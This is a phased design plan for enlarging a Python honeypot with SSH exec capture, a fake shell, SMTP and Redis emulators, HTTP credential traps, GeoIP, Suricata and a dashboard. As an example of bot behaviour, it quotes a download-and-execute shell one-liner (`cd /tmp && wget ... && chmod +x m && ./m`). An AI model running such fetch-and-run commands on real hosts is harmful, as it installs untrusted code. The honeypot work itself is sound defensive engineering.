# Honeypot Enhancement Plan

Inspired by [tpotce](https://github.com/telekom-security/tpotce). Keeps the existing
Python + SQLite + Flask architecture — no ELK stack. All new features follow the existing
pattern: a service module with a `start_*` function, logging through `log_event`, wired into
`main.py` as a daemon thread.

---

## Current State

| File | Purpose |
|------|---------|
| `main.py` | Starts all services as daemon threads |
| `logger.py` | `log_event()` → SQLite + file logging |
| `config.py` | Ports, feature flags, env-var defaults |
| `ratelimit.py` | Per-IP + global connection cap |
| `services/ssh_honey.py` | SSH emulator (paramiko) |
| `services/http_honey.py` | HTTP emulator |
| `services/ftp_honey.py` | FTP emulator |
| `services/telnet_honey.py` | Telnet emulator (IAC-aware) |
| `dashboard/app.py` | Flask app — `/api/events`, `/api/stats` (no auth on routes today; tests still expect old token auth) |
| `alerts/discord.py` | Discord webhook, `send_alert()` |
| `tests/test_honeypot.py` | Existing test suite (stale dashboard auth expectations — Phase 0) |

**Current DB schema:**
```sql
CREATE TABLE events (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp  TEXT NOT NULL,
    ip         TEXT NOT NULL,
    port       INTEGER NOT NULL,
    service    TEXT NOT NULL,
    event_type TEXT NOT NULL,
    data       TEXT
);
```

---

## Scope: what you actually need

The full phase list below is a **menu**. A small, coherent honeypot needs far less.

| Priority | Phases | Rationale |
|----------|--------|-----------|
| **Core** | 0 → 1 → 2 | Green tests, solid logging/DB, GeoIP for context. Everything else hangs off this. |
| **High value / medium effort** | 4.1 (SSH exec only), 6 (start with 2–3 HTTP traps), 9 without charts | Captures real bot behaviour; dashboard stays useful without Chart.js/D3. |
| **Defer unless you care** | 3 (D3 map — heavy), 4.2–4.4 (fake shell — lots of edge cases), 5.1 SMTP (blocked port 25 on many hosts), 7 Suricata (ops + Linux host network), 8 AbuseIPDB (API key + quota + executor) | Each is legitimate; none is required for a working instrumented honeypot. |
| **Pick one** | 5.2 Redis *or* 5.1 SMTP first | Two parsers and two open ports; add the second when the first is boring. |

**Rules of thumb:** (1) Ship **SSH exec logging** before **interactive fake shell** — most bots never open a shell. (2) **Suricata** is the largest ops leap; skip it until the Python honeypot is stable on a VPS. (3) **Attack map** is polish; **SSE + a simple “recent attacks” list** covers the same curiosity with a fraction of the JS. (4) If you skip Phase 8, `abuse_score` stays `NULL` — no schema change needed.

---

## Phases

---

### Phase 0 — Fix Broken Tests

**Why first:** `TestDashboard` still expects Basic auth + `DASHBOARD_TOKEN`, but `dashboard/app.py`
does not enforce it — several tests fail or disagree with production code. Fix before touching
anything else.

**File:** `tests/test_honeypot.py`

**Remove:** `test_index_requires_auth`, `test_api_events_requires_auth`,
`test_api_stats_requires_auth`, `test_wrong_password_rejected`, `test_index_ok_with_auth` (redundant
once unauthenticated access is the contract).

**Adjust:** `test_api_events_returns_list` and `test_api_stats_structure` — drop `headers=self._auth()`
and the `_auth()` helper / `DASHBOARD_TOKEN` patch if nothing else needs them. Keep
`importlib.reload(dashboard.app)` with `DB_PATH` patch so the temp DB is still used.

**Optional cleanup (same phase):** remove unused `DASHBOARD_TOKEN` from `config.py` and env docs,
or leave it for a future auth phase — do not leave tests and config implying auth that does not exist.

**Tests to add:**
- `test_index_returns_200`
- `test_api_events_returns_200`
- `test_api_stats_returns_200`

---

### Phase 1 — Foundation

Everything else depends on this. Do it in one sitting before starting any other phase.

#### 1.1 DB Migration

**File:** `logger.py` — `init_db()`

Add new columns using `ALTER TABLE ... ADD COLUMN IF NOT EXISTS` (needs SQLite **3.35+**;
Python 3.12 + Docker `python:3.12-slim` ship new enough versions). Place after the
`CREATE TABLE IF NOT EXISTS` block.

```sql
-- New columns on events
ALTER TABLE events ADD COLUMN IF NOT EXISTS country     TEXT;
ALTER TABLE events ADD COLUMN IF NOT EXISTS city        TEXT;
ALTER TABLE events ADD COLUMN IF NOT EXISTS lat         REAL;
ALTER TABLE events ADD COLUMN IF NOT EXISTS lon         REAL;
ALTER TABLE events ADD COLUMN IF NOT EXISTS abuse_score INTEGER;

-- New table for Suricata alerts (Phase 7)
CREATE TABLE IF NOT EXISTS suricata_alerts (
    id        INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT NOT NULL,
    src_ip    TEXT NOT NULL,
    src_port  INTEGER,
    dst_port  INTEGER,
    proto     TEXT,
    alert_sig TEXT,
    category  TEXT,
    severity  INTEGER,
    raw       TEXT
);

-- Indexes: start minimal (fewer indexes = faster INSERTs under fire).
CREATE INDEX IF NOT EXISTS idx_events_timestamp ON events(timestamp);
CREATE INDEX IF NOT EXISTS idx_events_ip        ON events(ip);
-- Add when you implement filters/geo dashboards and EXPLAIN shows scans:
-- CREATE INDEX IF NOT EXISTS idx_events_country ON events(country);
-- CREATE INDEX IF NOT EXISTS idx_events_service ON events(service);
CREATE INDEX IF NOT EXISTS idx_suricata_timestamp ON suricata_alerts(timestamp);
```

Keep existing **`PRAGMA journal_mode=WAL`** in `init_db()` after opening the connection — it already
matches multi-threaded `log_event` + dashboard readers.

#### 1.2 JSON Line Logging

**File:** `logger.py`

Replace the plain-text log line with a JSON write. No custom handler class needed — open
once, protect writes with a **`threading.Lock`** so concurrent `log_event` calls from service
threads cannot interleave partial lines (simple and standard for append-only logs):

```python
import threading

_jsonl_lock = threading.Lock()
_log_file = open(os.path.join(LOG_DIR, "honeypot.jsonl"), "a", buffering=1)

# In log_event, replace the _file_logger.info(...) call with:
line = json.dumps(event_dict) + "\n"
with _jsonl_lock:
    _log_file.write(line)
```

`buffering=1` is line-buffered — each write is one line; the lock keeps each line atomic
from the reader’s perspective.

Remove the old **`FileHandler` → `honeypot.log`** setup if JSONL replaces it — one primary log
sink is easier to tail and ship.

#### 1.3 Event Callback Registry

**File:** `logger.py`

Features that react to **every** event (live map SSE, optional AbuseIPDB) need hooks without
`logger.py` importing them (circular import). A tiny callback list is enough:

```python
_event_callbacks: list = []

def register_event_callback(fn):
    _event_callbacks.append(fn)
```

At the end of `log_event`, after the DB insert, call each callback with the event dict. Wrap
each call in `try/except` so a bad callback never crashes `log_event`.

Callbacks must be non-blocking — use `queue.put_nowait()`, never `queue.put()`. Under a bot
storm, a blocking put stalls the handler thread. If the queue is bounded, catch
`queue.Full` and **drop** the event (simple backpressure; never block `log_event`).

`dashboard/app.py` registers the SSE publisher **if** you build the attack map (Phase 3).
Optional `threat_intel.py` registers the same way — add `import threat_intel` in `main.py` only
when that file exists, alongside other imports so registration runs before threads start.

#### 1.4 `log_event` Return Value

**File:** `logger.py`

Add `"rowid"` to the returned dict (cheap; used by optional AbuseIPDB updates in Phase 8).
Safe to include even if you never ship Phase 8.

```python
return {"rowid": cursor.lastrowid, "timestamp": timestamp, "ip": ip, ...}
```

No existing callers break — adding a key is non-destructive.

#### 1.5 Config additions (Phase 1 only)

**File:** `config.py` — add **only** what Phase 1 and Discord need. Put port/API keys in the
phase that introduces the feature (keeps `config.py` readable).

```python
# Discord: one alert per IP per alert_type per N seconds (prevents flooding)
DISCORD_ALERT_COOLDOWN = int(os.environ.get("DISCORD_ALERT_COOLDOWN", "60"))

# High-signal shell/download alerts (used once Phase 4 ships); 0/false/no/off to disable
ALERT_ON_EXEC = os.environ.get("ALERT_ON_EXEC", "1").strip().lower() not in ("0", "false", "no", "off")
ALERT_ON_DOWNLOAD = os.environ.get("ALERT_ON_DOWNLOAD", "1").strip().lower() not in ("0", "false", "no", "off")
```

**Add later when you implement each phase:**

| Phase | Example vars |
|-------|----------------|
| 3 | `SERVER_LAT`, `SERVER_LON` (attack map “victim” endpoint) |
| 4 | `SSH_ACCEPT_RATE`, `TELNET_ACCEPT_RATE` |
| 5 | `SMTP_PORT`, `REDIS_PORT` |
| 7 | `SURICATA_EVE_LOG` |
| 8 | `ABUSEIPDB_API_KEY` |

#### 1.6 Fix `alerts/discord.py`

Two bugs to fix:

**Bug 1 — Unknown alert types bypass toggles and still fire.** The current code only returns
early for `"credential"` / `"connect"` when toggles are off. Any other `alert_type` falls through
and sends. Fix: **whitelist only** `connect`, `credential`, `exec_attempt`, and `download_attempt`
(Phase 4 uses both exec and `wget`/`curl` download paths). Apply the existing toggles for
`connect` and `credential`; use `ALERT_ON_EXEC` for `exec_attempt` and `ALERT_ON_DOWNLOAD` for
`download_attempt`. **Drop** any other `alert_type` with no webhook call.

**Bug 2 — No rate limiting.** A bot firing many exec/download requests spawns many webhook
threads. Fix: a module-level `dict[str, float]` keyed by `f"{ip}:{alert_type}"` and skip if the
last send was within `DISCORD_ALERT_COOLDOWN` seconds (applies to all allowed types).

**Tests to add** (extend `TestDiscordAlerts` in `test_honeypot.py`):
- `test_unknown_alert_type_dropped` — `alert_type="foobar"` never calls `_post`
- `test_exec_alert_fires` — `alert_type="exec_attempt"` calls `_post`
- `test_cooldown_deduplicates` — same IP+type twice within 60s calls `_post` only once

**Tests to add** (`tests/test_logger.py` — new file):
- `test_schema_has_geo_columns` — assert `country`, `city`, `lat`, `lon` in schema after `init_db`
- `test_suricata_table_created` — assert `suricata_alerts` table exists
- `test_indexes_created` — assert `idx_events_timestamp`, `idx_events_ip`, and
  `idx_suricata_timestamp` exist (drop assertions for country/service indexes until you add them)
- `test_log_event_returns_rowid` — returned dict has integer `rowid`
- `test_callback_called` — registered callback receives the event dict
- `test_bad_callback_doesnt_crash_log_event` — raising callback doesn't prevent return
- `test_migration_idempotent` — call `init_db()` twice on an existing DB, no error

---

### Phase 2 — GeoIP Enrichment

**New file:** `geoip.py`

Use **`geoip2fast`** — bundles its own database, zero setup, no registration, no monthly URL.
`pip install geoip2fast`.

At implementation time: inspect the result object attributes by running
`python3 -c "from geoip2fast import GeoIP2Fast; print(GeoIP2Fast().lookup('8.8.8.8'))"`.
Country code is reliable. **Skip a centroid dict at first** — if lat/lon are missing, the map
simply does not draw an arc for that event (simplest). Add centroids later only if the map looks
too empty.

Wire into `log_event`: call `geoip.lookup(ip)` and include the result fields in both the
INSERT and the returned dict. Private IPs short-circuit immediately using `ipaddress.ip_address(ip).is_private`. Any exception returns `{}` — GeoIP failure must never break logging.

**New dep:** `geoip2fast` in `requirements.txt`

**Tests to add** (`tests/test_geoip.py`):
- `test_private_ips_return_empty` — `192.168.1.1`, `127.0.0.1`, `10.0.0.1` all return `{}`
- `test_public_ip_has_country` — mock `lookup` to return a country (avoid network flakiness)
- `test_bad_input_returns_empty` — `""`, `"not-an-ip"` return `{}` without raising
- `test_geo_written_to_db` — prefer mocking `geoip.lookup` to return a fixed country so the test
  stays offline-stable; a live `8.8.8.8` check is optional

---

### Phase 3 — Live Attack Map

**Simplest useful version:** implement **§3.1 SSE only** and a **small HTML/JS panel** that
appends JSON lines to a list (no D3, no TopoJSON). That validates the pipeline with ~10% of the
work. Add **§3.2** (D3 + map) when you want the visual.

**Config:** add `SERVER_LAT` / `SERVER_LON` to `config.py` when you start this phase (see §1.5 table).

#### 3.1 SSE Backend

**File:** `dashboard/app.py`

**Critical:** add `threaded=True` to `app.run()`. Without it, the first SSE client's
long-lived connection blocks every other HTTP request on the dashboard.

Add a module-level list of per-client queues protected by a `threading.Lock`. Register a
`publish_attack` callback at module level (runs at import time, before service threads start).
The callback builds a small payload dict `{src_lat, src_lon, dst_lat, dst_lon, service,
country, ip}` and, for each client queue, `put_nowait` inside `try` / `except queue.Full`:
on full, **skip** that client for this event (slow consumers miss arcs; the server stays
responsive). Never block the logging path.

The SSE generator yields events from its queue with a 30s keepalive comment on timeout.
Add the client queue on entry, remove it in `finally` with the lock held.

New route: `GET /api/attack-stream` — `Content-Type: text/event-stream`.

#### 3.2 Attack Map Frontend (optional polish)

**Files:** `dashboard/templates/index.html`, `dashboard/static/` (vendored assets)

Vendor **D3.js v7** and the world 110m TopoJSON locally (Chart.js stays in Phase 9 if you add
charts). Avoid CDN assets on a lab box without outbound internet.

Map: D3.js Natural Earth projection, SVG arcs from attacker to server, 3-second fade-out.
Skip events with null coordinates. Throttle DOM updates to ~10 arcs/second to avoid jank on
a busy server. Set `SERVER_LAT`/`SERVER_LON` in `.env` — the London default is just a placeholder.

**Tests to add** (`tests/test_attack_map.py`):
- `test_sse_content_type` — GET `/api/attack-stream`, assert `text/event-stream`
- `test_event_with_geo_published` — call `publish_attack` with valid lat/lon, assert queued
- `test_event_without_geo_not_published` — `lat=None`, assert nothing queued
- `test_full_queue_doesnt_raise` — fill client queue to max, call again, no exception

---

### Phase 4 — SSH Improvements

Implement in order: exec channel first (simpler, highest value), interactive shell second.

#### 4.1 SSH Exec Channel

**File:** `services/ssh_honey.py` — `_SSHServer`

Most SSH bots never open an interactive shell. They authenticate, then immediately fire a
single `exec` request containing a shell one-liner: `cd /tmp && wget http://... && chmod +x m && ./m`.
The current code silently discards these — it's the most valuable data we're missing.

Add `check_channel_exec_request(self, channel, command)`:
- Decode the command string
- Extract URLs with a simple regex (`https?://\S+`)
- Log as `"download_attempt"` if URLs or wget/curl found, otherwise `"exec_attempt"`
- Discord: same classification — `alert_type="download_attempt"` (respects `ALERT_ON_DOWNLOAD` +
  cooldown) or `alert_type="exec_attempt"` (`ALERT_ON_EXEC` + cooldown), never the wrong one
- Return `True`, send exit status 0, close channel

#### 4.2 Fake Shell

**New file:** `services/fake_shell.py`

Shared by SSH and Telnet. Single entry point: `run_shell(send_fn, recv_line_fn, ip, port, service, username)`.

Cap concurrent sessions at 20 with a `threading.Semaphore`. If full, send
`bash: fork: Resource temporarily unavailable\r\n` and return.

Fake filesystem (`_FS` dict): `/etc/passwd`, `/etc/hostname`, `/etc/os-release`,
`/proc/version`, `/var/log/auth.log` (a few fake entries for realism).

Commands:

| Input | Response |
|---|---|
| `id`, `whoami` | `uid=0(root) gid=0(root) groups=0(root)` |
| `uname -a` | Fake kernel string |
| `ls`, `ls -la` | Fake `/root` listing |
| `pwd` | Current directory (tracks `cd`) |
| `cd <path>` | Update cwd silently |
| `cat <path>` | Content from `_FS`, or `No such file or directory` |
| `wget <url>`, `curl <url>` | Log `download_attempt`, sleep 1s, `Connection refused` |
| `exit`, `logout` | End session |
| anything else | `bash: <cmd>: command not found` |

Command logging: `log_event(..., "command", {"cmd": line})` for all commands.
`wget`/`curl` additionally logged as `"download_attempt"` and trigger a Discord alert (Phase 1
whitelist + `ALERT_ON_DOWNLOAD` + cooldown).
No Discord alerts for ordinary commands.

PTY input: `recv_line_fn` must buffer bytes until `\r`/`\n`, strip backspace (`\x7f`/`\x08`)
from the buffer, and discard ANSI escape sequences (`\x1b[...`). Without this, logged commands
contain garbage from arrow keys and corrections.

Inactivity timeout: 120s (set on the underlying socket before passing to `run_shell`).

#### 4.3 SSH Integration

**File:** `services/ssh_honey.py`

Add to `_SSHServer`:
- `check_channel_pty_request` → return `True`
- `check_channel_shell_request` → return `True`

Without both, paramiko silently rejects the shell and `fake_shell` never runs.

Accept 1-in-`SSH_ACCEPT_RATE` (default: 5) logins to lure bots into an interactive session.
Track attempt count on the `_SSHServer` instance.

#### 4.4 Telnet Integration

**File:** `services/telnet_honey.py`

Same pattern: accept 1-in-`TELNET_ACCEPT_RATE` (default: 3) logins and call `run_shell`.
The existing `_recv_line` already handles IAC stripping and works as `recv_line_fn` directly.

**Tests to add** (`tests/test_fake_shell.py`):
- `test_id_returns_root`
- `test_cat_known_file` — `/etc/passwd` contains `root:`
- `test_cat_unknown_file_returns_error`
- `test_cd_updates_pwd`
- `test_wget_logs_download_attempt` — assert `download_attempt` event logged with URL
- `test_wget_sends_discord_alert`
- `test_ordinary_command_no_discord_alert` — `ls` does not call `send_alert`
- `test_exit_ends_session`
- `test_backspace_stripped` — `ls\x7f\x7fps\n` is logged as `ps`
- `test_session_cap_blocks_when_full`

**Tests to add** (`tests/test_ssh_honey.py`):
- `test_exec_request_logged` — `check_channel_exec_request` logs `exec_attempt`
- `test_exec_wget_logged_as_download` — wget URL in exec → `download_attempt`
- `test_pty_request_returns_true`
- `test_shell_request_returns_true`

---

### Phase 5 — New Services

Implement **one** of 5.1 or 5.2 first; wire it in `main.py`, ship it, then add the other.

#### 5.1 SMTP Honeypot

**New file:** `services/smtp_honey.py`

Port 25. Only useful on a host that **allows inbound SMTP** (many clouds block port 25 by
default; document that in `.env.example`). Otherwise the code can sit idle harmlessly.

State machine: GREETING → EHLO/HELO → MAIL FROM → RCPT TO (repeatable) → DATA → body until
`\r\n.\r\n` → log → QUIT. Respond `250 OK` to everything to act as an open relay.

**AUTH credential decoding:** Bots send `AUTH PLAIN <base64>` where the payload decodes to
`\x00username\x00password`. Without decoding, stored credentials are unreadable. Decode with
`base64.b64decode`, split on `\x00`. `AUTH LOGIN` sends username and password as two separate
base64 lines. Log both formats as `event_type="credential"`.

Log completed email sessions as `event_type="email_attempt"` with `{helo, mail_from, rcpt_to,
subject, body_preview}`.

Discord alerts: yes for `credential` only. `email_attempt` is too noisy on a public server
(spammers probe port 25 constantly — the cooldown helps but hundreds of unique IPs per hour
would still flood Discord).

Add to `SERVICES` in `main.py`.

#### 5.2 Redis Honeypot

**New file:** `services/redis_honey.py`

Port 6379. Redis uses RESP. Modern clients send RESP arrays (`*1\r\n$4\r\nPING\r\n`); older
tools send inline (`PING\r\n`). The parser must handle both — read the first line, if it starts
with `*` parse N bulk strings, otherwise split the inline string. **Cap read size** (e.g. 8–16 KiB
per command) so a single connection cannot allocate unbounded memory.

| Command | Response |
|---|---|
| `PING` | `+PONG\r\n` |
| `AUTH <pw>` | log `credential`, `+OK\r\n` |
| `INFO` | bulk string with fake Redis INFO output |
| `CONFIG GET *`, `KEYS *` | `*0\r\n` (empty array) |
| `DBSIZE` | `:0\r\n` |
| everything else | `+OK\r\n` |

Never return `-ERR unknown command` — it signals we're a honeypot.

Discord alerts: `credential` events only.

Add to `SERVICES` in `main.py`.

**Tests to add** (`tests/test_smtp.py`):
- `test_banner_is_220`
- `test_full_session_logged` — EHLO → MAIL FROM → RCPT TO → DATA session, assert `email_attempt` event
- `test_auth_plain_decoded` — assert `username` and `password` readable, not base64
- `test_multiple_rcpt_captured`

**Tests to add** (`tests/test_redis.py`):
- `test_inline_ping` — `PING\r\n` → `+PONG\r\n`
- `test_resp_array_ping` — `*1\r\n$4\r\nPING\r\n` → `+PONG\r\n`
- `test_auth_logs_credential` — assert credential event with password
- `test_unknown_command_returns_ok` — `FLUSHALL` → `+OK\r\n`, not `-ERR`

---

### Phase 6 — HTTP Trap Expansion

**File:** `services/http_honey.py`

Add a route dispatch table before the existing fallback response. Normalise the path first:
strip query string, strip trailing slash, lowercase.

**Ship these first** (high scanner volume, clear value):

| Path (normalised) | Response | Event type |
|---|---|---|
| `/wp-login.php` | GET: fake login form. POST: extract `log`+`pwd` from body | `trap_hit` / `credential` |
| `/wp-admin` | Redirect → `/wp-login.php` | `trap_hit` |
| `/.env` | Fake env file with plausible-looking fake credentials | `trap_hit` |

**Add when bored** (same pattern, copy-paste responses):

| Path | Notes |
|------|--------|
| `/phpmyadmin`, `/.git/config`, `/.aws/credentials`, `/admin` (401 Basic), `/actuator/env`, `/manager/html` | As in the original tpot-style wishlist |

All trap hits log full headers (cap at 20) and body (cap at 1024 bytes).

Discord alerts: yes for `credential`, no for `trap_hit` — scanners hit every path constantly.

All other paths (including log4j/jndi scanner paths) fall through to the existing default
response and are logged with the full request — no special casing needed.

**Tests to add** (`tests/test_http_traps.py`) — cover each trap you actually ship; minimum:
- `test_wp_login_post_extracts_credentials` — POST `log=admin&pwd=pass`, assert credential event
- `test_dotenv_returns_content` — GET `/.env`, assert 200 with non-empty body
- `test_path_normalised` — GET `/wp-admin/` (trailing slash) hits wp-admin handler
- `test_unknown_path_returns_default` — `/some/path` returns normal Apache page

---

### Phase 7 — Suricata Integration (optional)

**Skip entirely** until the Python honeypot is stable on a Linux VPS. This phase is the largest
ops jump (host networking, caps, interface choice, rule updates).

Suricata runs as a Docker sidecar and sees traffic the honeypot daemons never touch.

#### 7.1 Docker

**Canonical `docker-compose.yml` for honeypot + Suricata lives in Phase 10** (single copy — do not
maintain two snippets). Phase 7 is behaviour only: both services use `network_mode: host` on
**Linux**, shared `suricata-logs` volume, honeypot mounts that volume **read-only** at
`/var/log/suricata`, no `depends_on` between services. Without Suricata, use a **honeypot-only**
compose (your current bridge + `ports:` model is fine for early dev).

#### 7.2 Suricata Config

**New files:** `suricata/suricata.yaml`, `suricata/entrypoint.sh`

`suricata.yaml`: minimal — enable only `eve-log` output with `alert` event type to
`/var/log/suricata/eve.json`. Disable all other outputs.

`entrypoint.sh`: just run `suricata` directly. Update rules manually with
`docker compose exec suricata suricata-update` when needed — not on every start (it's slow and
runs on boot when rules are already fresh).

`SURICATA_IFACE` env var (default `eth0`) controls which interface to monitor. On many VMs the
interface is `ens3` or `ens160` — check with `ip link show`.

**First deploy (keep it short):** set `SURICATA_IFACE` to a real interface; run
`suricata-update` once if alerts are empty; confirm `eve.json` appears under the shared
volume before relying on the tailer.

#### 7.3 Eve Tailer

**New file:** `services/suricata_tailer.py`

Tail `SURICATA_EVE_LOG`. If the file doesn't exist, poll every 10s until it does. Seek to end
on open (don't replay history). On each line, parse JSON, skip non-`alert` events, insert into
`suricata_alerts` table.

Add to `SERVICES` in `main.py`.

**Tests to add** (`tests/test_suricata_tailer.py`):
- `test_alert_inserted` — write fake eve.json alert to temp file, run tailer briefly, assert row in DB
- `test_non_alert_ignored` — write a `dns` event, assert no row inserted
- `test_bad_json_no_crash` — write a truncated line, assert tailer continues

---

### Phase 8 — Threat Intel Enrichment (optional)

**New file:** `threat_intel.py`

Nice-to-have, not core. Skip if you do not want an API key, quota math, or background HTTP.

AbuseIPDB lookup via their free v2 API (1k/day). Enrich only `credential` and
`download_attempt` events — this covers the highest-value events while staying well within the
free tier quota.

Pattern: non-blocking. Register a callback that submits work to a
`ThreadPoolExecutor(max_workers=4)`. Each worker task opens its **own** `sqlite3.connect(DB_PATH)`
for the `UPDATE` (SQLite connections are not portable across threads). The HTTP response drives the
`abuse_score` update using `rowid` from the event dict.

Cache per-IP results with a 24h TTL (`dict[ip → (score, time)]`). Handle HTTP 429 by logging a
warning and pausing lookups for 1 hour.

If `ABUSEIPDB_API_KEY` is empty, the module loads but does nothing.

**Tests to add** (`tests/test_threat_intel.py`):
- `test_private_ip_skipped` — `192.168.1.1` never calls the API
- `test_non_enriched_event_type_skipped` — `event_type="connect"` skipped
- `test_result_updates_db_row` — mock HTTP response, assert `abuse_score` written to correct row
- `test_ip_cached` — same IP twice within 24h, HTTP called only once

---

### Phase 9 — Dashboard Improvements

**Files:** `dashboard/app.py`, `dashboard/templates/index.html`

#### New API Endpoints

**`GET /api/timeline`** — attacks per hour for the last 24h. Group by hour bucket using SQL that
matches the stored `timestamp` format (UTC ISO strings from `datetime.now(timezone.utc).isoformat()`).
Validate in tests: if `strftime` on the column returns unexpected NULLs, use a simple expression
that works for your format (e.g. `substr(timestamp, 1, 13)` for `YYYY-MM-DDTHH`) or normalize in
Python when building the series. Uses `idx_events_timestamp` for the time filter range.

**`GET /api/geo-stats`** — top 20 countries by event count. If this gets slow on a big DB,
enable `idx_events_country` from §1.1 (you commented it out for lean INSERTs).

**`GET /api/events`** — extend with query params: `?service=`, `?event_type=`, `?search=` (IP
prefix match only — no `LIKE '%x%'` full-table scan), `?limit=`, `?offset=`.

**`GET /api/events/export.csv`** — stream CSV rows from a cursor, one at a time. Never load all
rows into memory. Use `flask.Response` with a generator and the **`csv` module** with default
quoting so commas/newlines in fields do not break the file (and cells are not raw formula
injection for spreadsheet users).

**`GET /api/suricata/alerts`** — last 200 rows from `suricata_alerts`.

#### UI

**Minimum:** filter bar + events table + “Export CSV” (no new JS libraries).

**If you want charts:** vendor **Chart.js** once and add (1) timeline line chart, (2) top
countries bar chart, refreshing on a timer. **Skip Chart.js** entirely if you expose the same
data as JSON and refresh simple `<pre>` or tables — uglier but zero frontend deps.

**Suricata / SMTP / Redis panels:** only after those services exist; hide or omit the widgets
when the backing table is empty or the phase was skipped.

**Tests to add** (`tests/test_dashboard.py` — new file, extends pattern from `TestDashboard`):
- `test_timeline_returns_list`
- `test_geo_stats_returns_list`
- `test_filter_by_service` — seed SSH + HTTP events, `?service=SSH` returns only SSH
- `test_filter_by_ip` — `?search=1.2.3` returns only matching IPs
- `test_export_csv_headers` — assert `Content-Type: text/csv` and correct column header row
- `test_suricata_alerts_returns_list`

---

### Phase 10 — Docker and Deployment

Use **either** this file (Suricata path) **or** a smaller honeypot-only compose until Phase 7.

#### `docker-compose.yml` (honeypot + Suricata, Linux host networking)

```yaml
services:
  honeypot:
    build: .
    network_mode: host
    cap_add: [NET_BIND_SERVICE]
    environment:
      - DISCORD_WEBHOOK_URL=${DISCORD_WEBHOOK_URL:-}
      - ABUSEIPDB_API_KEY=${ABUSEIPDB_API_KEY:-}
      - SERVER_LAT=${SERVER_LAT:-51.5074}
      # Quote negative default so Compose does not treat the leading "-" as syntax
      - SERVER_LON=${SERVER_LON:-"-0.1278"}
      - SURICATA_EVE_LOG=/var/log/suricata/eve.json
    volumes:
      - honeypot-data:/app/data
      - honeypot-logs:/app/logs
      - suricata-logs:/var/log/suricata:ro
    restart: unless-stopped

  suricata:
    image: jasonish/suricata:latest
    network_mode: host
    cap_add: [NET_ADMIN, NET_RAW, SYS_NICE]
    environment:
      - SURICATA_IFACE=${SURICATA_IFACE:-eth0}
    volumes:
      - suricata-logs:/var/log/suricata
      - ./suricata/suricata.yaml:/etc/suricata/suricata.yaml:ro
      - ./suricata/entrypoint.sh:/entrypoint.sh:ro
    command: ["/bin/sh", "/entrypoint.sh"]
    restart: unless-stopped

volumes:
  honeypot-data:
  honeypot-logs:
  suricata-logs:
```

#### `Dockerfile`

```dockerfile
FROM python:3.12-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
RUN mkdir -p logs data
EXPOSE 22 21 23 25 80 6379 8080
CMD ["python", "main.py"]
```

#### `requirements.txt`

```
paramiko~=3.5
flask~=3.1
requests~=2.32
geoip2fast
```

#### `setup.sh` additions

After the SSH port change block, allow every **honeypot TCP port on the host**. Host
networking does not bypass UFW — if a port is not allowed, nothing reaches the process.

```bash
for port in 22 21 23 25 80 6379 8080; do
    ufw allow ${port}/tcp 2>/dev/null || true
done
```

#### `.env.example`

```bash
DISCORD_WEBHOOK_URL=

# Free at https://www.abuseipdb.com/register
ABUSEIPDB_API_KEY=

# Your server's actual coordinates (find at latlong.net)
SERVER_LAT=51.5074
SERVER_LON=-0.1278

# Network interface Suricata should monitor (check: ip link show)
SURICATA_IFACE=eth0

# SMTP honeypot listens on 25; many VPS providers block inbound 25 — check their policy
# SMTP_PORT=25

# Discord: optional toggles for exec / download alerts (Phase 1 + 4); 1/true/on = enabled
# ALERT_ON_EXEC=1
# ALERT_ON_DOWNLOAD=1
```

---

## Plan confidence checklist

| Check |
|-------|
| `python -m pytest tests/ -v` green; dashboard tests match **no-auth** reality (Phase 0). |
| Discord: **whitelist only** known `alert_type` values; cooldown on; exec vs download toggles correct. |
| SQLite WAL on; any thread-pool `UPDATE` uses its **own** connection. |
| Open firewall ports match what actually listens on the host (especially after switching to host networking). |

**Non-goals:** Flask dev server + no TLS is fine for a home lab. Suricata + host networking = **Linux VPS only**, not Docker Desktop on Windows/Mac.

---

## Implementation Order

**Recommended lean path:** `0 → 1 → 2 → 4.1 → 6 (MVP traps) → 9 (API + filters + CSV, no charts)`.
Then add `5.x`, `4.2–4.4`, `3`, `8`, `7+10` in whatever order interests you.

**Full phase list (dependency order):**

```
Phase 0   Fix broken tests                          prerequisite
Phase 1   Foundation (DB, logging, callbacks)       everything else depends on this
Phase 2   GeoIP                                     unlocks geo columns + optional map
Phase 3   Live view / attack map                    optional; SSE (3.1) before D3 (3.2)
Phase 4   SSH improvements                          4.1 exec before 4.2–4.4 fake shell
Phase 5   SMTP / Redis                              pick one service first
Phase 6   HTTP traps                                MVP paths first
Phase 7   Suricata                                  optional; Linux + compose change
Phase 8   Threat intel                              optional; needs Phase 1 rowid
Phase 9   Dashboard                                 grow UI with available backends
Phase 10  Docker + deployment                       honeypot-only until Phase 7
```

---

## New Files

Skip rows for phases you defer (no empty `threat_intel.py` “just in case”).

| File | Phase | Purpose |
|------|-------|---------|
| `geoip.py` | 2 | `geoip2fast` wrapper |
| `threat_intel.py` | 8 | AbuseIPDB async enrichment |
| `services/fake_shell.py` | 4 | Shared fake shell (SSH + Telnet) |
| `services/smtp_honey.py` | 5 | SMTP emulator |
| `services/redis_honey.py` | 5 | Redis RESP emulator |
| `services/suricata_tailer.py` | 7 | Tail Suricata eve.json |
| `suricata/suricata.yaml` | 7 | Minimal Suricata config |
| `suricata/entrypoint.sh` | 7 | Start Suricata |
| `dashboard/static/d3.v7.min.js` | 3 | Vendored D3.js |
| `dashboard/static/chart.min.js` | 9 | Vendored Chart.js |
| `dashboard/static/world-110m.json` | 3 | Vendored world TopoJSON |
| `.env.example` | 10 | Documents all env vars |
| `tests/test_logger.py` | 1 | Logger/DB tests |
| `tests/test_geoip.py` | 2 | GeoIP tests |
| `tests/test_attack_map.py` | 3 | SSE tests |
| `tests/test_fake_shell.py` | 4 | Fake shell tests |
| `tests/test_ssh_honey.py` | 4 | SSH exec/shell tests |
| `tests/test_smtp.py` | 5 | SMTP tests |
| `tests/test_redis.py` | 5 | Redis RESP tests |
| `tests/test_http_traps.py` | 6 | HTTP trap tests |
| `tests/test_suricata_tailer.py` | 7 | Eve tailer tests |
| `tests/test_threat_intel.py` | 8 | AbuseIPDB tests |
| `tests/test_dashboard.py` | 9 | New dashboard endpoint tests |
